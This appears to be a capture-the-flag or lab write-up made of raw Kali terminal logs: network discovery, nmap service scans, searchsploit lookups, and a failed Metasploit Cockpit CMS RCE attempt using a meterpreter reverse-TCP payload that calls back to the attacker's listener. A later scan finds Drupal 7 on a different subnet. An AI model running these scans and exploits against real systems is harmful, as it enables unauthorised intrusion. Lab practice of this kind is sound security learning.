Bridge Adapter Configuration
 ```
 >> netdiscover -r 10.233.56.1/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                 
                                                                                                                                               
 6 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 360                                                                               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.233.56.95    54:14:f3:dd:01:26      4     240  Intel Corporate                                                                             
 10.233.56.60    be:88:08:70:f5:61      2     120  Unknown vendor        
 ```

```
┌──(root㉿kali)-[/home/kali]
└─# nmap -p- -sS -sV -A 10.233.56.95
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 03:53 EST
Stats: 0:01:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:01:56 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.32% done; ETC: 03:55 (0:00:00 remaining)
Nmap scan report for 10.233.56.95
Host is up (0.00016s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
9090/tcp open  ssl/http Cockpit web service
|_ssl-date: TLS randomness does not represent time
|_http-title: Loading...
| ssl-cert: Subject: commonName=shibu/organizationName=b98a2262a2cf432c97935b5554f1348d
| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
| Not valid before: 2025-03-24T05:04:16
|_Not valid after:  2026-04-23T05:04:16
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     X-Frame-Options: sameorigin
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|_    font-weight: 300;
| http-robots.txt: 1 disallowed entry 
|_/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9090-TCP:V=7.95%T=SSL%I=7%D=11/21%Time=692028D0%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,DB7,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-Type
SF::\x20text/html;\x20charset=utf8\r\nTransfer-Encoding:\x20chunked\r\nX-D
SF:NS-Prefetch-Control:\x20off\r\nReferrer-Policy:\x20no-referrer\r\nX-Con
SF:tent-Type-Options:\x20nosniff\r\nCross-Origin-Resource-Policy:\x20same-
SF:origin\r\nX-Frame-Options:\x20sameorigin\r\n\r\n29\r\n<!DOCTYPE\x20html
SF:>\n<html>\n<head>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\x20request\r\nc3
SF:2\r\n</title>\n\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20
SF:content=\"text/html;\x20charset=utf-8\">\n\x20\x20\x20\x20<meta\x20name
SF:=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">
SF:\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20\"RedHatDisplay\",\x
SF:20\"Open\x20Sans\",\x20Helvetica,\x20Arial,\x20sans-serif;\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2012px;\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x201\.66666667;\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#333333;\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#f5f5f5;\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20img\x
SF:20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x200;\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20vertical-align:\x20middle;
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20h1
SF:\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20
SF:300;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20")%r(HTTPOptio
SF:ns,DB7,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-Type:\x20text/htm
SF:l;\x20charset=utf8\r\nTransfer-Encoding:\x20chunked\r\nX-DNS-Prefetch-C
SF:ontrol:\x20off\r\nReferrer-Policy:\x20no-referrer\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nCross-Origin-Resource-Policy:\x20same-origin\r\nX-F
SF:rame-Options:\x20sameorigin\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>\n<h
SF:ead>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\x20request\r\nc32\r\n</title>
SF:\n\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"tex
SF:t/html;\x20charset=utf-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"
SF:\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x2
SF:0\x20<style>\n\x20\x20\x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20font-family:\x20\"RedHatDisplay\",\x20\"Open\x20S
SF:ans\",\x20Helvetica,\x20Arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20font-size:\x2012px;\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20line-height:\x201\.66666667;\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20color:\x20#333333;\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20background-color:\x20#f5f5f5;\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20img\x20{\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x200;\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20vertical-align:\x20middle;\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\n\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20300;\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20");
MAC Address: 54:14:F3:DD:01:26 (Intel Corporate)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.16 ms 10.233.56.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.54 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ searchsploit Cockpit     
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Cockpit CMS 0.11.1 - 'Username Enumeration & Password Reset' NoSQL In | multiple/webapps/50185.py
Cockpit CMS 0.4.4 < 0.5.5 - Server-Side Request Forgery               | php/webapps/44567.txt
Cockpit CMS 0.6.1 - Remote Code Execution                             | php/webapps/49390.txt
Cockpit Version 234 - Server-Side Request Forgery (Unauthenticated)   | multiple/webapps/49397.txt
openITCOCKPIT 3.6.1-2 - Cross-Site Request Forgery                    | php/webapps/47305.py
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

```
                                                                                                        
┌──(root㉿kali)-[/home/kali]
└─# msfconsole
Metasploit tip: Store discovered credentials for later use with creds
                                                  
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-                    
                                    `:sm⏣~~Destroy.No.Data~~s:`                
                                 -+h2~~Maintain.No.Persistence~~h+-              
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
                      :we're.all.alike'`                     The.PFYroy.No.D7:  
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
                      :<script>.Ac816/                        sENbove3101.404:    
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
                      :#OUTHOUSE-  -s:                       /corykennedyData:    
                      :$nmap -oS                              SSo.6178306Ence:    
                      :Awsm.da:                            /shMTl#beats3o.No.:    
                      :Ring0:                             `dDestRoyREXKC3ta/M:    
                      :23d:                               sSETEC.ASTRONOMYist:    
                       /-                        /yo-    .ence.N:(){ :|: & };:    
                                                 `:Shall.We.Play.A.Game?tron/    
                                                 ```-ooy.if1ghtf0r+ehUser5`    
                                               ..th3.H1V3.U2VjRFNN.jMh+.`                                                                                                                                                                   
                                              `MjM~~WE.ARE.se~~MMjMs                                                                                                                                                                        
                                               +~KANSAS.CITY's~-`                                                                                                                                                                           
                                                J~HAKCERS~./.`                                                                                                                                                                              
                                                .esc:wq!:`                                                                                                                                                                                  
                                                 +++ATH`                                                                                                                                                                                    
                                                  `                                                                                                                                                                                         
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
       =[ metasploit v6.4.98-dev                                ]                                                                                                                                                                           
+ -- --=[ 2,571 exploits - 1,316 auxiliary - 1,680 payloads     ]                                                                                                                                                                           
+ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]                                                                                                                                                                           
                                                                                                                                                                                                                                            
Metasploit Documentation: https://docs.metasploit.com/                                                                                                                                                                                      
The Metasploit Framework is a Rapid7 Open Source Project                                                                                                                                                                                    
                                                                                                                                                                                                                                            
msf > search cockpit
                                                                                                                                                                                                                                            
Matching Modules                                                                                                                                                                                                                            
================                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
   #  Name                                Disclosure Date  Rank    Check  Description                                                                                                                                                       
   -  ----                                ---------------  ----    -----  -----------
   0  exploit/multi/http/cockpit_cms_rce  2021-04-13       normal  Yes    Cockpit CMS NoSQLi to RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/cockpit_cms_rce

msf > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(multi/http/cockpit_cms_rce) > options

Module options (exploit/multi/http/cockpit_cms_rce):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   ENUM_USERS  true             no        Enumerate users
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks4, socks5, socks5h, http, sapni
   RHOSTS                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The URI of Cockpit
   USER                         no        User account to take over
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.233.56.40     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(multi/http/cockpit_cms_rce) > set RHOSTS 10.233.56.95
RHOSTS => 10.233.56.95
msf exploit(multi/http/cockpit_cms_rce) > set RPORT 9090
RPORT => 9090
msf exploit(multi/http/cockpit_cms_rce) > exploit
[*] Started reverse TCP handler on 10.233.56.40:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[-] Exploit aborted due to failure: unexpected-reply: 10.233.56.95:9090 - Could not connect to the web service
[*] Exploit completed, but no session was created.


```


After trying any of these option, I saw somewhere that there are more services present on this current VM, so I used any other command for NMAP to get more information of the VM.

```

┌──(root㉿kali)-[/home/kali]
└─# nmap -A 10.0.2.10         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-21 04:56 EST
Nmap scan report for 10.0.2.10
Host is up (0.00042s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-server-header: Apache/2.2.22 (Debian)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41184/tcp6  status
|   100024  1          41377/udp   status
|   100024  1          43877/tcp   status
|_  100024  1          55458/udp6  status
MAC Address: 08:00:27:AE:A2:85 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms 10.0.2.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.61 seconds

```